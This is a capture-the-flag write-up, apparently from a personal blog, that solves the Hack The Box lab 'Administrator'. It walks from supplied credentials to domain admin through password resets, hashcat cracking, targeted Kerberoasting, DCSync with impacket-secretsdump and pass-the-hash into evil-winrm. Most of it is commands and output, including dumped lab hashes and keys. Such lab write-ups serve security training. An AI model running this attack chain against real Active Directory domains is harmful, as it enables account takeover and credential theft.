---
title: "Administrator"
tags:
    - machine
    - Active Directory
date: "2025-04-19"
thumbnail: "/assets/img/thumbnail/Administartor.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Administartor.png" alt="Administartor">

# Solution
---
## Recon
---

scanning the target

```
# Nmap 7.94SVN scan initiated Wed Nov 20 16:59:11 2024 as: nmap -sV -sC -Pn -p 3268,50448,50468,49667,464,593,49664,21,9389,3269,88,49669,50443,55495,445,50500,636,49666,135,5985,47001,50455,139,53,389 -oA administrator 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 21:59:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50443/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50448/tcp open  msrpc         Microsoft Windows RPC
50455/tcp open  msrpc         Microsoft Windows RPC
50468/tcp open  msrpc         Microsoft Windows RPC
50500/tcp open  msrpc         Microsoft Windows RPC
55495/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-20T22:00:16
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 20 17:00:29 2024 -- 1 IP address (1 host up) scanned in 78.44 seconds
```

we have credentials given before the start

<img src="/assets/img/htb/administrator/image 1.png" alt="creds">

---

## shell as michael

No interesting Shares

No access to ftp as `Olivia`

got users using `nxc smb <ip> -u user -p password --users` 

```python
olivia
michael
benjamin
emily
ethan
alexander
emma
```

using bloodhound

<img src="/assets/img/htb/administrator/image 2.png" alt="oliver to michael">

as olivia we have `Generic All` against `michael`  so we can change his password

```powershell
*Evil-WinRM* PS C:\Users\olivia\Documents> $password = ConvertTo-SecureString "k4k45h1@123" -AsPlainText -Force
nText -Force
*Evil-WinRM* PS C:\Users\olivia\Documents> Set-ADAccountPassword -Identity "michael" -Reset -NewPassword $password
```

now can login as `michael`

---

## Shell as benjamin

michael has no access to FTP

from bloodhound

<img src="/assets/img/htb/administrator/image 3.png" alt="michael to benjamin">

we have `ForceChangePassword` against `benjamin`

```powershell
*Evil-WinRM* PS C:\Users\michael\Desktop> $password = ConvertTo-SecureString "k4k45h1@123" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Desktop> Set-ADAccountPassword -Identity "benjamin" -Reset -NewPassword $password
```

---

## Shell as emily

As `benjamin` we can access ftp and get the files existing `Backup.psafe3`

This is like keepass.

we can open it using `password safe` app, but we need the password

Getting the password ⇒ using `hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt` 

`Backup.psafe3:tekieromucho` 

we can get the password of `emily` now and got **`user flag`**

---

## Shell as ethan

emily has `generic write` on ethan

<img src="/assets/img/htb/administrator/image 4.png" alt="emily to ethan">

we can add SPN and get the TGS and crack it

<img src="/assets/img/htb/administrator/image 5.png" alt="generic write">

```bash
┌──(youssif㉿youssif)-[~/Desktop/tools]
└─$ powerview administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'@administrator.htb
Logging directory is set to /home/youssif/.powerview/logs/administrator.htb
(LDAP)-[dc.administrator.htb]-[ADMINISTRATOR\emily]
PV > Set-DomainObject -Identity ethan -Set serviceprincipalname='nonexistent/k4k45h1'   
[2024-11-29 16:25:22] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb                                                          
(LDAP)-[dc.administrator.htb]-[ADMINISTRATOR\emily]
PV > Get-DomainUser ethan | Select serviceprincipalname
cn                                : Ethan Hunt
distinguishedName                 : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
name                              : Ethan Hunt
objectGUID                        : {1a62f8b3-a5dd-4d55-8b37-464a32825662}
userAccountControl                : NORMAL_ACCOUNT [66048]
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 2024-11-29 12:00:21.069912
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 2024-11-29 12:07:54.226166
pwdLastSet                        : 2024-10-12 20:52:14.117811
primaryGroupID                    : 513
objectSid                         : S-1-5-21-1088858960-373806567-254189436-1113
sAMAccountName                    : ethan
sAMAccountType                    : SAM_USER_OBJECT
userPrincipalName                 : ethan@administrator.htb
servicePrincipalName              : nonexistent/k4k45h1
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=administrator,DC=htb
```

Getting the hash

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/administrator]
└─$ impacket-GetUserSPNs   administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  --------  --------------------------  --------------------------  ----------
nonexistent/k4k45h1   ethan            2024-10-12 22:52:14.117811  2024-11-29 14:07:54.226166             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$cf77338f92c5e38aa62ddd45c7aebc4a$32fb63edd8d4a681a29ebe7e4586a29936e15d21e79911698f76940ec74d0b0b755d9f4bb7cc822a04fbe60a3629229079e97e2fd8d56d1a2c2e364f46dac40899f518922a1b4e715f49f119336e76fc40d531a71c54bfa2be49d9f933f1a808e00d63260d4a150ea16bea899ec19ef67bb93d17e154e805ec8b3e7b16088289d08061c5ba169a16a93d54b1088fc3f1e53100a03b21139b7587610e5143174aeb27c03f92e69dcfcaa2e80acc1a68698467612ae9635c1d376cbefb42be8ce43ef24427c020b1457631a19e18340f4ebb7bf3ea0c86ea75c2e319fc95b52f980a8b8dd27bb45ad4fe3649bf2d9968fa01ea5d6b1308aeec4d6f5ec56b95390ff146cacdc2e16b3d02d106785cbaa02f0b0076badc2c985f753b87d26d11abab1dc6989b4234c65d437318558e75aaf2397b4af77c3afc3c6f056c362618b666f6352782545c2b8f22dfc361c5344d7c930d052aa27799396947f09332ffddb3eebe068b61fca10358af722cf43753b8c5add7bcc755ecacd8d4a8a16c50ccb8a511971a4b31f3c73f7f84018d5253bcc53f28f48c0c4c0b9579dcf98d6d2bdf4b57082ed163b03a48c7b5261c482a63c3a8b528ca2191a212257055eaeab502dd00f9f7a885a5d4697b9c03d6414473dab00381f0b6f92ec38504cdae1069842d59777237f963ee8f629a99df9b517f536bd5225c973e575edbc50ca87445057d97f7165e2fc34f2008008a590940a30e874c906b84917a536eeb5c12adc51f219804d848d213730962dcbe2525a5906376c48fba8abfa9084cc1aa538375e4615d47edf1609c830a7e925539adb9262ee78215609c29a486aa0ac4fc849be8857cdb23323fac8ffb406400188b8dff7cb11ab8c81d7e6906e3956f39b4c95582bb3deb3163f8a62c00b030b8bd790151ef989b87fb5e0050cd3959a08b2b73c2bf615df00986b0cee7824e03edde72946d3b517af35be78eebf1ba3f27c36ecc89589d7fc6032becd52bf5a683f8e9559d0d68a298891f264d32d6ad424f44c03e386d17d94a4bc9b0d92baf963cb503d25450d5e8b5e100cb2a03fb0fa41a568e6c879201e59fc7f631d09687e8b6163f623e0c9c841e7b9bcc9753d2921c4652cd9abe1a6546b0075714c1f04ca9e61b2dab68afc1ee437de3e89efd70ba5b388deefd6a8ab6dc0430b99c1ea80fa7d2bd433e4b98ac6efc954a76468e8c9e6c66ee618acca54513ffd924b0dc6b733402861a223492bcdb4ec25a98b4586037e85af688ef51d67b45cfae9903f0b529817f69f1a0b30f7dbbaaf1473118970599e53c13141b2b4403524016eac91792ff329c35e9dd74191f9f3e1e5cfaa7109c6ffacb307226336bb9ab7035bfeb8b06d65b31737c37351ed788aa2205760dab22be1b1597b331c1f04bc2cea05421f504e884e25beb4ce7647275f2e7c7536ceff836f01ee2f62db76521a03d4acfe00c2a01959f1619dcd50546a38a81876fb472464fab9711136820bac6badb44dec5795829088cb7835f2ef298
```

cracking it to get the password of `ethan` is `limpbizkit` 

---

## Shell as Administrator

<img src="/assets/img/htb/administrator/image 6.png" alt="DCsync">

We have `DCsync` GG!!

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/administrator]
└─$ impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.10.11.42                         
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:bb53a477af18526ada697ce2e51f76b3:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:a96ff145f7bed44fe462c575ae0f3577:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:5a67836f41cbf81bb895e038f24736d014b1a8e21b7a02d0f27311ea5165d182
administrator.htb\michael:aes128-cts-hmac-sha1-96:45f26e505610edfeb639d69babdc88d7
administrator.htb\michael:des-cbc-md5:1c08c867201a02f8
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:67cd41e233b05fa1390ea76602e1ed393a13879be72a2cfd72298bb32dc8c0ba
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:9f9ecd4fa7f833ce7fba54455e38fe6f
administrator.htb\benjamin:des-cbc-md5:c185d0c143b915c1
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
                                                                                                   
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/administrator]
└─$ evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

```powershell
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/29/2024   3:01 AM             34 root.txt
```

GG !!
